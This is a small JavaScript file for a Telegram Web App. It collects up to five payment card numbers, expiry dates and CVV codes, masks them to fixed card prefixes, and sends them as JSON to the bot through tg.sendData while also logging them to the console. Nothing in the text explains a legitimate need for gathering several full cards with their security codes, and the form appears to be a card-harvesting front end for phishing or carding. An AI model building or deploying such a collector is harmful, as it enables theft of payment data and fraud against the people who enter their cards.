let tg = window.Telegram.WebApp;

$(document).ready(function() {
    $("#btnSubmit").click(function(){

        cards=[
            {"card":$("#c1").val(), "date":$("#d1").val(),"ccv":$("#ccv1").val()},
            {"card":$("#c2").val(), "date":$("#d2").val(),"ccv":$("#ccv2").val()},
            {"card":$("#c3").val(), "date":$("#d3").val(),"ccv":$("#ccv3").val()},
            {"card":$("#c4").val(), "date":$("#d4").val(),"ccv":$("#ccv4").val()},
            {"card":$("#c5").val(), "date":$("#d5").val(),"ccv":$("#ccv5").val()}
        ];
        tg.sendData(JSON.stringify(cards)); 
        console.log(cards);
        
    }); 
});

$(function(){
    //2. Получить элемент, к которому необходимо добавить маску
    tg.MainButton.text = "отправить карты"
    $(".bcard4").mask("4444 9999 9999 9999", {placeholder: "4444 5678 9123 4567" });
    $(".bcard").mask("5177 9999 9999 9999", {placeholder: "5177 5678 9123 4567" });
    $(".litle").mask("99/99", {placeholder: "мм/гг" });
    $(".tall").mask("999", {placeholder: "ccv" });
  });

